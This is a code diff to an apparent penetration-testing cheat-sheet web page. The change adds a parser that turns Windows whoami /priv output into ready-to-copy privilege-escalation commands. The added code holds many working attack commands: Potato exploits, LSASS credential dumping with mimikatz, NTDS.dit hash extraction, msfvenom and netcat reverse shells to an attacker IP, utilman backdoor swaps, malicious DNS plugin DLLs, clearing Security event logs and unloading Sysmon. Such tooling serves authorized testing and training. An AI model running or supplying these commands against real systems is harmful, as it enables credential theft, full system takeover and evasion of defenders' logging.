@@ -370,6 +370,7 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
   <button class="topbar-btn" onclick="openModal('dt-modal');dtInit()" title="Interactive privesc decision tree">&#127807; Guide</button>
   <button class="topbar-btn" id="btn-stab" onclick="toggleStab()" title="Shell stabilization quick-ref">&#128024; Stab</button>
   <button class="topbar-btn" onclick="showHelp()" title="Keyboard shortcuts">&#63;</button>
+  <a href="token.html" target="_blank" class="topbar-btn" title="Full Token Privilege Arsenal — all privs, all steps, all tools" style="text-decoration:none">&#9889; TokenPriv</a>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════ -->
@@ -451,14 +452,14 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
 <div class="modal-overlay" id="si-modal" onclick="overlayClose(event,'si-modal')">
   <div class="modal">
     <div class="modal-header">
-      <span class="modal-title">&#128269; System Info Parser — paste output → instant CVE matching</span>
+      <span class="modal-title">&#128269; Smart Parser — systeminfo / whoami /all / uname -a → instant exploit matching</span>
       <button class="modal-close" onclick="closeModal('si-modal')">&#215;</button>
     </div>
     <div class="modal-body">
-      <div class="si-msg warn" style="margin-bottom:10px">Windows: paste full <code>systeminfo</code> output &nbsp;|&nbsp; Linux: paste <code>uname -a</code> or <code>cat /etc/os-release</code> output</div>
-      <textarea class="si-textarea" id="si-input" placeholder="Paste systeminfo or uname -a output here…&#10;&#10;Windows example:&#10;OS Name:     Microsoft Windows Server 2019 Standard&#10;OS Version:  10.0.17763 N/A Build 17763&#10;&#10;Linux example:&#10;Linux target 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 x86_64 GNU/Linux" oninput="siAutoDetect()"></textarea>
+      <div class="si-msg warn" style="margin-bottom:10px">Accepts: <code>systeminfo</code> &nbsp;|&nbsp; <code>whoami /all</code> or <code>whoami /priv</code> &nbsp;|&nbsp; <code>uname -a</code> &nbsp;|&nbsp; <code>cat /etc/os-release</code> — auto-detects the type</div>
+      <textarea class="si-textarea" id="si-input" style="height:160px" placeholder="Paste ANY of these outputs:&#10;&#10;  systeminfo&#10;  whoami /all  (or whoami /priv)&#10;  uname -a&#10;  cat /etc/os-release&#10;&#10;Auto-detects input type and shows exploit paths instantly." oninput="siAutoDetect()"></textarea>
       <button class="si-btn" onclick="parseSI()">&#9989; Analyze</button>
-      <div id="si-output"><div class="si-placeholder">Paste output above and click Analyze — auto-detects Windows vs Linux</div></div>
+      <div id="si-output"><div class="si-placeholder">Paste output above and click Analyze — supports systeminfo, whoami /all, whoami /priv, uname -a</div></div>
     </div>
   </div>
 </div>
@@ -2127,8 +2128,8 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 systeminfo | findstr /i "Build\|Architecture" — Running x64 exploit on x86 target = crash. Match the exploit binary to the target.
 </div>
 
-<div class="subsection"><div class="subsection-title">CVE-2023-29360 — Kernel LPE (Win10/11, Server 2016-2022)</div>
-<div class="desc-text">Impacted: Win10 (1607, 1809, 21H2, 22H2), Win11 (21H2, 22H2), Server 2016/2019/2022. Fix: KB5027215</div>
+<div class="subsection"><div class="subsection-title">CVE-2023-29360 — Kernel Streaming Service LPE (mskssrv.sys)</div>
+<div class="desc-text">Impacted: Win10 (1607+, 1809, 21H2, 22H2), Win11 (21H2, 22H2), Server 2016/2019/2022. Fix: KB5027215</div>
 <div class="cmd-wrap"><pre class="cmd">systeminfo | findstr /i "Build"</pre></div>
 <div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/CVE-2023-29360.exe -Outfile {{WPATH}}\CVE-2023-29360.exe
 {{WPATH}}\CVE-2023-29360.exe</pre></div>
@@ -2451,7 +2452,7 @@ python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only --s
 <tr>
   <td><code>CVE-2021-36934</code></td>
   <td class="impact-admin">HiveNightmare / SeriousSAM</td>
-  <td>19041–19044 (Win10 20H1–21H2)</td>
+  <td>17763–19044 (Win10 1809–21H2 + Win11 22000)</td>
   <td><a href="https://github.com/GossiTheDog/HiveNightmare" target="_blank">GossiTheDog/HiveNightmare</a></td>
   <td>KB5005010</td>
 </tr>
@@ -2470,7 +2471,7 @@ python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only --s
   <td>KB5014754</td>
 </tr>
 <tr>
-  <td><code>CVE-2023-21608</code></td>
+  <td><code>CVE-2023-21746</code></td>
   <td class="impact-admin">LocalPotato</td>
   <td>19041–19045, 22000, 22621</td>
   <td><a href="https://github.com/decoder-it/LocalPotato" target="_blank">decoder-it/LocalPotato</a></td>
@@ -2487,7 +2488,7 @@ python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only --s
   <td><code>CVE-2024-21338</code></td>
   <td class="impact-admin">appid.sys LPE (PPL bypass)</td>
   <td>19041–19045, 22000, 22621</td>
-  <td><a href="https://github.com/varwara/CVE-2024-21338" target="_blank">varwara/CVE-2024-21338</a></td>
+  <td><a href="https://github.com/Crowdfense/CVE-2024-21338" target="_blank">Crowdfense/CVE-2024-21338</a></td>
   <td>KB5034763</td>
 </tr>
 <tr>
@@ -2500,7 +2501,7 @@ python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only --s
 <tr>
   <td><code>CVE-2019-0708</code></td>
   <td class="impact-admin">BlueKeep (RDP RCE)</td>
-  <td>9600 (Win8.1/Srv2012R2), 7601 (Win7)</td>
+  <td>7601 (Win7/Srv2008R2), 9200 (Srv2012) — NOT Win8.1+</td>
   <td>Metasploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce</td>
   <td>KB4499175</td>
 </tr>
@@ -2520,7 +2521,7 @@ python3 wesng/wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only --s
 </tr>
 <tr>
   <td><code>CVE-2023-29360</code></td>
-  <td class="impact-admin">Kernel LPE (TPM)</td>
+  <td class="impact-admin">Kernel LPE (mskssrv.sys)</td>
   <td>19041–19045, 22000, 22621</td>
   <td><a href="https://github.com/Wh04m1001/CVE-2023-29360" target="_blank">Wh04m1001/CVE-2023-29360</a></td>
   <td>KB5027215</td>
@@ -2875,7 +2876,8 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePat
     <pre class="cmd">python3 -m http.server {{PORT}}</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">EXPLOIT</div>
-    <pre class="cmd">dnscmd /config /serverlevelplugindll \\{{KALI_IP}}\share\privesc.dll</pre>
+    <pre class="cmd">dnscmd dc01 /config /serverlevelplugindll \\{{KALI_IP}}\share\privesc.dll
+# Replace dc01 with DC hostname; omit if running on DC itself</pre>
     <pre class="cmd">sc stop "DNS Server" &amp;&amp; sc start "DNS Server"</pre>
   </div>
   <div class="pipe-step pipe-verify"><div class="pipe-step-label">SMB SHARE (Kali)</div>
@@ -6997,9 +6999,9 @@ const WIN_VULNS = [
    tool:'SharpPrintNightmare / Invoke-Nightmare',
    link:'https://github.com/calebstewart/CVE-2021-1675',
    cond:'Spooler running (sc query spooler) + none of July 2021 patch KBs installed'},
-  {name:'CVE-2023-29360 Kernel LPE',cve:'CVE-2023-29360',type:'cve',min:19041,max:22631,
+  {name:'CVE-2023-29360 Kernel LPE',cve:'CVE-2023-29360',type:'cve',min:14393,max:22631,
    patchKBs:['KB5027215'],sev:'h',section:'win-kernel-cves',
-   desc:'Kernel LPE via Windows TPM driver — June 2023 patch.',
+   desc:'Kernel LPE via Windows Kernel Streaming Service (mskssrv.sys) — June 2023 patch.',
    tool:'Wh04m1001/CVE-2023-29360',
    link:'https://github.com/Wh04m1001/CVE-2023-29360',
    cond:'No KB5027215'},
@@ -7015,7 +7017,7 @@ const WIN_VULNS = [
    tool:'chompie1337/SMBGhost_RCE_PoC',
    link:'https://github.com/chompie1337/SMBGhost_RCE_PoC',
    cond:'Build 18362/18363/19041 + no KB4551762'},
-  {name:'HiveNightmare / SeriousSAM',cve:'CVE-2021-36934',type:'cve',min:19041,max:19044,
+  {name:'HiveNightmare / SeriousSAM',cve:'CVE-2021-36934',type:'cve',min:17763,max:22000,
    patchKBs:['KB5005010'],sev:'h',section:'win-kernel-cves',
    desc:'World-readable SAM/SECURITY/SYSTEM hives — any local user reads them directly. No tools needed.',
    tool:'reg save HKLM\\SAM + secretsdump',
@@ -7027,7 +7029,7 @@ const WIN_VULNS = [
    tool:'ly4k/SpoolFool',
    link:'https://github.com/ly4k/SpoolFool',
    cond:'Spooler running + no KB5010342 or KB5010345'},
-  {name:'LocalPotato',cve:'CVE-2023-21608',type:'cve',min:19041,max:22621,
+  {name:'LocalPotato',cve:'CVE-2023-21746',type:'cve',min:19041,max:22621,
    patchKBs:['KB5022282'],sev:'h',section:'win-potatoes',
    desc:'NTLM reflection via local IPC — Jan 2023 patch. Works on modern Win10/11.',
    tool:'decoder-it/LocalPotato',
@@ -7071,6 +7073,328 @@ const LIN_VULNS = [
    check:'Affects: RHEL 8, Fedora 34, Ubuntu 20.04 LTS (specific package versions)'},
 ];
 
+// ═══════════════════════════════════════════════════════════════
+//  TOKEN PRIVILEGE EXPLOIT MAP  (from token.html arsenal)
+// ═══════════════════════════════════════════════════════════════
+const PRIV_EXPLOITS = {
+  'SeImpersonatePrivilege': {
+    sev:'c', section:'win-potatoes',
+    summary:'Potato family → SYSTEM. Most common path on IIS/MSSQL.',
+    tools:[
+      {name:'GodPotato-NET4.exe', note:'Best — works Server 2012–2022 + Win10/11', cmd:'{{WPATH}}\\GodPotato-NET4.exe -cmd "cmd /c whoami"', link:'https://github.com/BeichenDream/GodPotato'},
+      {name:'PrintSpoofer64.exe', note:'Win10/Srv2016/2019 — requires Spooler running', cmd:'{{WPATH}}\\PrintSpoofer64.exe -i -c cmd', link:'https://github.com/itm4n/PrintSpoofer'},
+      {name:'JuicyPotatoNG.exe', note:'Server 2019+ fallback', cmd:'{{WPATH}}\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"', link:'https://github.com/antonioCoco/JuicyPotatoNG'},
+      {name:'SigmaPotato.exe', note:'No Spooler needed — build ≥ 18362', cmd:'{{WPATH}}\\SigmaPotato.exe "cmd /c whoami"', link:'https://github.com/tylerdotrar/SigmaPotato'},
+      {name:'SweetPotato.exe', note:'Combined JuicyPotato+PrintSpoofer — good fallback', cmd:'{{WPATH}}\\SweetPotato.exe -e EfsRpc -p "cmd.exe" -a "/c whoami"', link:'https://github.com/CCob/SweetPotato'},
+    ],
+    warning:'If shell was spawned by a service account (LOCAL SERVICE / NETWORK SERVICE) → run FullPowers.exe FIRST to restore stripped tokens before any potato.',
+    detect:'whoami /priv | findstr SeImpersonate'
+  },
+  'SeAssignPrimaryTokenPrivilege': {
+    sev:'c', section:'win-potatoes',
+    summary:'Same as SeImpersonate — full potato family applies.',
+    tools:[
+      {name:'GodPotato-NET4.exe', note:'Universal — works all builds', cmd:'{{WPATH}}\\GodPotato-NET4.exe -cmd "cmd /c whoami"', link:'https://github.com/BeichenDream/GodPotato'},
+      {name:'JuicyPotatoNG.exe', note:'Server 2019+', cmd:'{{WPATH}}\\JuicyPotatoNG.exe -t * -p "cmd.exe"', link:'https://github.com/antonioCoco/JuicyPotatoNG'},
+    ],
+    warning:'Often present alongside SeImpersonatePrivilege. One or both → potato works.',
+    detect:'whoami /priv | findstr SeAssignPrimaryToken'
+  },
+  'SeDebugPrivilege': {
+    sev:'c', section:'win-exploits',
+    summary:'Read/write any process memory → LSASS dump → steal credentials or SYSTEM token.',
+    tools:[
+      {name:'mimikatz.exe', note:'Dump LSASS in-memory — most complete', cmd:'{{WPATH}}\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', link:'https://github.com/gentilkiwi/mimikatz'},
+      {name:'procdump.exe', note:'Safe LSASS dump — bring to Kali for offline parsing', cmd:'{{WPATH}}\\procdump.exe -ma lsass.exe lsass.dmp', link:'https://docs.microsoft.com/sysinternals/downloads/procdump'},
+      {name:'rundll32 comsvcs.dll', note:'No extra tool — built-in', cmd:'powershell -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full"', link:''},
+      {name:'Kali: mimikatz offline', note:'After transferring lsass.dmp to Kali', cmd:'mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit', link:''},
+    ],
+    warning:'Dumping LSASS triggers Defender and most AV. Use comsvcs.dll method or procdump -r flag for evasion.',
+    detect:'whoami /priv | findstr SeDebug'
+  },
+  'SeBackupPrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Bypass file ACLs — read any file including NTDS.dit → all domain hashes.',
+    tools:[
+      {name:'diskshadow.exe (built-in)', note:'Create VSS shadow copy to access NTDS.dit', cmd:'diskshadow /s pwn.dsh', link:''},
+      {name:'SeBackupPrivilegeUtils.dll', note:'Copy NTDS.dit via backup semantics', cmd:'Copy-FileSeBackupPrivilege Z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit', link:'https://github.com/giuliano108/SeBackupPrivilege'},
+      {name:'robocopy /b', note:'Built-in backup-mode file copy', cmd:'robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM SECURITY', link:''},
+      {name:'Kali: secretsdump', note:'After transferring hive/ntds files', cmd:'impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL', link:''},
+    ],
+    steps:['echo "set context persistent nowriters" > pwn.dsh && echo "add volume c: alias pwn" >> pwn.dsh && echo "create" >> pwn.dsh && echo "expose %pwn% z:" >> pwn.dsh',
+           'diskshadow.exe /s pwn.dsh',
+           'Import-Module .\\SeBackupPrivilegeCmdLets.dll; Import-Module .\\SeBackupPrivilegeUtils.dll',
+           'Copy-FileSeBackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit',
+           'reg save HKLM\\SYSTEM C:\\Temp\\system',
+           'impacket-secretsdump -ntds ntds.dit -system system LOCAL  # on Kali'],
+    warning:'Evil-WinRM strips SeBackupPrivilege. Use native PSRemoting session instead.',
+    detect:'whoami /priv | findstr SeBackup'
+  },
+  'SeRestorePrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Write any file bypassing ACLs → replace system binary → SYSTEM.',
+    tools:[
+      {name:'SeRestoreAbuse.exe', note:'Cleanest — no binary swap needed', cmd:'{{WPATH}}\\SeRestoreAbuse.exe "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/xct/SeRestoreAbuse'},
+      {name:'Manual utilman swap', note:'RDP must be open (port 3389)', cmd:'ren C:\\Windows\\System32\\utilman.exe utilman.old && copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe', link:''},
+      {name:'Reg key hijack', note:'Modify ImagePath of a service via registry backup semantics', cmd:'reg save HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc C:\\Temp\\svc.hiv', link:''},
+    ],
+    warning:'Requires RDP for utilman swap. SeRestoreAbuse.exe is the cleanest option.',
+    detect:'whoami /priv | findstr SeRestore'
+  },
+  'SeTakeOwnershipPrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Take ownership of any file/object → grant yourself write → replace binary.',
+    tools:[
+      {name:'takeown + icacls (built-in)', note:'No extra tools needed', cmd:'takeown /f C:\\Windows\\System32\\utilman.exe && icacls C:\\Windows\\System32\\utilman.exe /grant "%USERNAME%":F', link:''},
+      {name:'PowerShell SetOwner', note:'More reliable on modern builds', cmd:'$acl=Get-Acl C:\\Windows\\System32\\utilman.exe; $acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERNAME"); Set-Acl C:\\Windows\\System32\\utilman.exe $acl', link:''},
+    ],
+    warning:'Back up utilman.exe before replacing! Save as utilman.bak.',
+    detect:'whoami /priv | findstr SeTakeOwnership'
+  },
+  'SeManageVolumePrivilege': {
+    sev:'c', section:'win-exploits',
+    summary:'Grant Everyone:FullControl on C:\\ → drop DLL in System32 subdir → trigger SYSTEM DLL load. Used on PG Practice "Access" box.',
+    tools:[
+      {name:'SeManageVolumeExploit.exe', note:'Grants C:\\ full permissions instantly', cmd:'{{WPATH}}\\SeManageVolumeExploit.exe', link:'https://github.com/CsEnox/SeManageVolumeExploit'},
+      {name:'msfvenom (Kali)', note:'Generate malicious PrintConfig.dll', cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll', link:''},
+      {name:'PrintNotify CLSID trigger', note:'Trigger after placing DLL at spool\\drivers\\x64\\3\\', cmd:'$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)', link:''},
+      {name:'systeminfo trigger', note:'Place tzres.dll at System32\\wbem\\ instead', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo', link:''},
+    ],
+    steps:[
+      '1. {{WPATH}}\\SeManageVolumeExploit.exe   # grants C:\\ full perms',
+      '2. [Kali] msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll',
+      '3. iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"',
+      '4. [Kali] nc -lvnp {{RPORT}}',
+      '5. $type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)',
+    ],
+    warning:'svc_mssql accounts commonly hold this. DLL path must be exactly: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll',
+    detect:'whoami /priv | findstr SeManageVolume'
+  },
+  'SeLoadDriverPrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Load kernel driver without admin → load vulnerable signed driver → kernel exploit → SYSTEM.',
+    tools:[
+      {name:'EOPLOADDRIVER.exe', note:'Load driver via registry without admin', cmd:'{{WPATH}}\\EOPLOADDRIVER.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys', link:'https://github.com/TarlogicSecurity/EoPLoadDriver'},
+      {name:'ExploitCapcom.exe', note:'Exploit loaded Capcom driver', cmd:'{{WPATH}}\\ExploitCapcom.exe EXPLOITPATH {{WPATH}}\\shell.exe', link:'https://github.com/tandasat/ExploitCapcom'},
+      {name:'fltMC unload', note:'Side effect: unload security/AV drivers', cmd:'fltMC unload sysmondrv', link:''},
+    ],
+    warning:'Print Operators group also gets SeLoadDriverPrivilege. Clean up: reg delete HKLM\\System\\CurrentControlSet\\dfserv /f',
+    detect:'whoami /priv | findstr SeLoadDriver'
+  },
+  'SeTcbPrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Act as part of OS → create arbitrary SYSTEM-level token via LsaLogonUser → SYSTEM.',
+    tools:[
+      {name:'TcbElevation.exe', note:'Spawns SYSTEM process via SeTcb', cmd:'{{WPATH}}\\TcbElevation.exe pwn "C:\\Windows\\System32\\cmd.exe /c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178'},
+    ],
+    warning:'Very rarely delegated. If present alongside other privs, exploit SeTcb first for cleanest path.',
+    detect:'whoami /priv | findstr SeTcb'
+  },
+  'SeCreateTokenPrivilege': {
+    sev:'h', section:'win-exploits',
+    summary:'Forge arbitrary access token with any group memberships (including local admin) → escalate.',
+    tools:[
+      {name:'token-priv suite', note:'hatRiot PoC — NtCreateToken with admin group', cmd:'{{WPATH}}\\SeCreateTokenPrivilege.exe', link:'https://github.com/hatRiot/token-priv'},
+      {name:'PrivFu suite', note:'Full privilege manipulation', cmd:'{{WPATH}}\\TokenMagician.exe', link:'https://github.com/daem0nc0re/PrivFu'},
+    ],
+    warning:'Extremely rare in the wild. Usually only held by SYSTEM itself.',
+    detect:'whoami /priv | findstr SeCreateToken'
+  },
+  'SeSecurityPrivilege': {
+    sev:'m', section:'win-exploits',
+    summary:'Manage/read security event log → clear tracks or read audit data.',
+    tools:[
+      {name:'wevtutil (built-in)', note:'Clear Security + System logs', cmd:'wevtutil cl Security && wevtutil cl System && wevtutil cl Application', link:''},
+      {name:'wevtutil query', note:'Read Security events — find logon activity, creds', cmd:'wevtutil qe Security /c:50 /rd:true /f:text | findstr /i "pass\\|user\\|logon"', link:''},
+    ],
+    detect:'whoami /priv | findstr SeSecurityPriv'
+  },
+  'SeShutdownPrivilege': {
+    sev:'l', section:'win-exploits',
+    summary:'Force reboot → trigger service restarts, planted payloads, or race conditions.',
+    tools:[
+      {name:'shutdown (built-in)', note:'Immediate reboot', cmd:'shutdown /r /t 0', link:''},
+    ],
+    warning:'Use with DLL hijack or service payload that needs restart to trigger.',
+    detect:'whoami /priv | findstr SeShutdown'
+  },
+  'SeCreateSymbolicLinkPrivilege': {
+    sev:'m', section:'win-dll',
+    summary:'Create symlinks to privileged paths → redirect service file writes → arbitrary write as SYSTEM.',
+    tools:[
+      {name:'mklink (built-in)', note:'Symlink from writable dir → privileged path', cmd:'cmd /c mklink C:\\Temp\\target.dll C:\\Windows\\System32\\target.dll', link:''},
+      {name:'PowerShell New-Item', note:'More reliable PS version', cmd:'New-Item -ItemType SymbolicLink -Path C:\\Temp\\link -Target C:\\Windows\\System32\\vuln.dll', link:''},
+    ],
+    detect:'whoami /priv | findstr SeCreateSymbolic'
+  },
+};
+
+// Groups that imply specific attack paths
+const GROUP_EXPLOITS = {
+  'backup operators': {
+    sev:'h', section:'win-exploits',
+    summary:'Group membership grants SeBackupPrivilege + SeRestorePrivilege → NTDS.dit dump → all domain hashes.',
+    warning:'Evil-WinRM strips privileges — use native PSRemoting: New-PSSession + Enter-PSSession.',
+    tool:'SeBackupPrivilegeCmdLets.dll + diskshadow + secretsdump',
+    link:'https://github.com/giuliano108/SeBackupPrivilege'
+  },
+  'dnsadmins': {
+    sev:'h', section:'win-dnsadmins',
+    summary:'Load malicious DLL via DNS service → SYSTEM on DC. Requires DNS service restart.',
+    warning:'DNS restart causes ~60s outage. Notify if in real engagement.',
+    tool:'dnscmd /config /serverlevelplugindll \\\\KALI\\share\\evil.dll && sc stop dns && sc start dns',
+    link:'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dnsadmins-privesc'
+  },
+  'server operators': {
+    sev:'h', section:'win-exploits',
+    summary:'Can start/stop services + modify service binPath → change any SYSTEM service command → SYSTEM.',
+    tool:'sc config <svc> binPath= "cmd /c nc64.exe KALI PORT -e cmd" && sc start <svc>',
+    link:'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges'
+  },
+  'print operators': {
+    sev:'h', section:'win-exploits',
+    summary:'Gets SeLoadDriverPrivilege → load vulnerable kernel driver (Capcom/szkg64) → SYSTEM.',
+    tool:'EOPLOADDRIVER.exe + ExploitCapcom.exe',
+    link:'https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/'
+  },
+  'administrators': {
+    sev:'c', section:'win-lsass',
+    summary:'Already local admin. Dump LSASS → pass-the-hash, OR UAC bypass if medium integrity.',
+    tool:'mimikatz / procdump / Task Manager dump',
+    link:''
+  },
+};
+
+function parseTokenPrivs(raw, out) {
+  // Extract username + hostname if present
+  const userM = raw.match(/User Name\s+SID\s*[-=\s]+([\w\\.\-@]+)\s+(S-\d[-\d]+)/i)
+              || raw.match(/^([\w\\.\-@]+)\s+(S-1-5[-\d]+)/m);
+  const userName = userM ? userM[1].trim() : null;
+
+  // Extract all privilege lines: "PrivilegeName   Description   State"
+  const privLines = [];
+  const privRe = /^(Se\w+Privilege)\s+.+?(Enabled|Disabled)/gim;
+  let m;
+  while ((m = privRe.exec(raw)) !== null) {
+    privLines.push({name: m[1], enabled: m[2].toLowerCase() === 'enabled'});
+  }
+
+  // Also catch lines without description column (whoami /priv simple format)
+  if (privLines.length === 0) {
+    const simple = /^(Se\w+Privilege)\b/gim;
+    while ((m = simple.exec(raw)) !== null) {
+      if (!privLines.find(p => p.name === m[1]))
+        privLines.push({name: m[1], enabled: true});
+    }
+  }
+
+  // Extract group memberships from "GROUP INFORMATION" block
+  const groupBlock = raw.match(/GROUP INFORMATION[\s\S]*?(?=PRIVILEGES INFORMATION|USER CLAIMS|$)/i);
+  const userGroups = groupBlock ? groupBlock[0].toLowerCase() : '';
+
+  // Service account detection
+  const isLocalSvc = /nt authority\\local service|local service/i.test(raw);
+  const isNetSvc = /nt authority\\network service|network service/i.test(raw);
+  const isServiceAcct = isLocalSvc || isNetSvc;
+
+  const sevOrder = {c:0,h:1,m:2,l:3};
+
+  // Build output
+  let html = '<div class="si-os-header">';
+  html += '<div class="si-os-name">&#9889; Token Privilege Analysis</div>';
+  if (userName) html += `<div class="si-build">User: <code>${escHtml(userName)}</code></div>`;
+
+  // Service account warning
+  if (isServiceAcct) {
+    html += `<div style="margin-top:8px;padding:8px 12px;background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.3);border-radius:4px;font-size:12px;color:#ff7b72">
+      <strong>&#9888; SERVICE ACCOUNT DETECTED (${isLocalSvc?'LOCAL SERVICE':'NETWORK SERVICE'})</strong><br>
+      SeImpersonatePrivilege may be stripped from this token. Run <code>FullPowers.exe</code> FIRST:<br>
+      <code style="color:var(--cyan)">iwr http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -o C:\\Temp\\FullPowers.exe; C:\\Temp\\FullPowers.exe -c ".\\GodPotato-NET4.exe -cmd cmd" -z</code>
+    </div>`;
+  }
+
+  if (privLines.length === 0) {
+    html += '</div><div class="si-msg warn">&#9888; No privilege lines found. Paste the output of <code>whoami /priv</code> or <code>whoami /all</code>.</div>';
+    out.innerHTML = html;
+    return;
+  }
+
+  html += `<div class="si-arch">${privLines.length} privileges found — ${privLines.filter(p=>p.enabled).length} enabled, ${privLines.filter(p=>!p.enabled).length} disabled (disabled can be re-enabled)</div>`;
+  html += '</div>';
+
+  // Sort: critical exploitable first
+  const matched = privLines
+    .map(p => ({...p, exploit: PRIV_EXPLOITS[p.name]}))
+    .filter(p => p.exploit)
+    .sort((a,b) => {
+      // enabled+critical first
+      const aScore = (a.enabled ? 0 : 1) + (sevOrder[a.exploit.sev]||3)*2;
+      const bScore = (b.enabled ? 0 : 1) + (sevOrder[b.exploit.sev]||3)*2;
+      return aScore - bScore;
+    });
+
+  const unmatched = privLines.filter(p => !PRIV_EXPLOITS[p.name]);
+
+  let html2 = '<div class="si-vulns">';
+
+  // Group membership hits
+  Object.entries(GROUP_EXPLOITS).forEach(([grp, info]) => {
+    if (userGroups.includes(grp)) {
+      html2 += `<div class="si-card sv-vuln">
+        <div class="si-vtop">
+          <span class="si-vname">&#128101; ${grp.charAt(0).toUpperCase()+grp.slice(1)} Group</span>
+          <span class="si-stag s${info.sev}">${info.sev==='c'?'CRITICAL':'HIGH'}</span>
+          <span class="si-vstatus">&#9888; EXPLOITABLE</span>
+        </div>
+        <div class="si-vdesc">${info.summary}</div>
+        ${info.warning?`<div class="si-vcond">&#9888; ${info.warning}</div>`:''}
+        <div style="font-size:11px;color:var(--text2);margin-top:4px">Tool: <code style="color:var(--cyan)">${escHtml(info.tool)}</code>${info.link?` <a href="${info.link}" target="_blank" style="font-size:11px">&#8599;</a>`:''}</div>
+        ${info.section?`<a class="si-goto" href="#${info.section}" onclick="closeModal('si-modal')">&#8594; Jump to section</a>`:''}
+      </div>`;
+    }
+  });
+
+  if (matched.length === 0 && !Object.keys(GROUP_EXPLOITS).some(g => userGroups.includes(g))) {
+    html2 += '<div class="si-msg ok">&#10003; No directly exploitable privileges found in known list. Run winPEAS and PrivescCheck for deeper analysis.</div>';
+  }
+
+  matched.forEach(p => {
+    const ex = p.exploit;
+    const cls = p.enabled ? 'sv-vuln' : 'sv-check';
+    const sevLabel = ex.sev==='c'?'CRITICAL':ex.sev==='h'?'HIGH':ex.sev==='m'?'MEDIUM':'LOW';
+    html2 += `<div class="si-card ${cls}">
+      <div class="si-vtop">
+        <span class="si-vname">&#9889; ${p.name}</span>
+        <span class="si-stag s${ex.sev}">${sevLabel}</span>
+        <span class="si-vstatus">${p.enabled?'&#9888; ENABLED':'&#9744; DISABLED (still usable)'}</span>
+      </div>
+      <div class="si-vdesc">${ex.summary}</div>
+      ${ex.warning?`<div class="si-vcond" style="color:var(--orange)">&#9888; ${escHtml(ex.warning)}</div>`:''}
+      <div style="margin-top:8px">
+        ${ex.tools.map(t=>`
+        <div style="margin:5px 0;background:var(--bg4);border-radius:3px;padding:6px 10px">
+          <div style="font-size:10px;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:3px">
+            ${escHtml(t.name)}${t.note?` <span style="color:var(--text3);font-weight:400;font-size:9px">— ${escHtml(t.note)}</span>`:''}
+            ${t.link?`<a href="${t.link}" target="_blank" style="margin-left:6px;font-size:10px">&#8599; repo</a>`:''}
+          </div>
+          <code style="font-size:11px;color:var(--text);word-break:break-all;cursor:pointer" onclick="navigator.clipboard.writeText(this.textContent)">${escHtml(t.cmd)}</code>
+        </div>`).join('')}
+      </div>
+      ${ex.steps?`<details style="margin-top:6px"><summary style="font-size:11px;color:var(--cyan);cursor:pointer">&#9654; Full attack steps</summary>
+        <ol style="margin:8px 0 0 16px;font-size:11px;color:var(--text2);line-height:1.8">${ex.steps.map(s=>`<li><code style="font-size:10.5px;color:var(--text)">${escHtml(s)}</code></li>`).join('')}</ol>
+      </details>`:''}
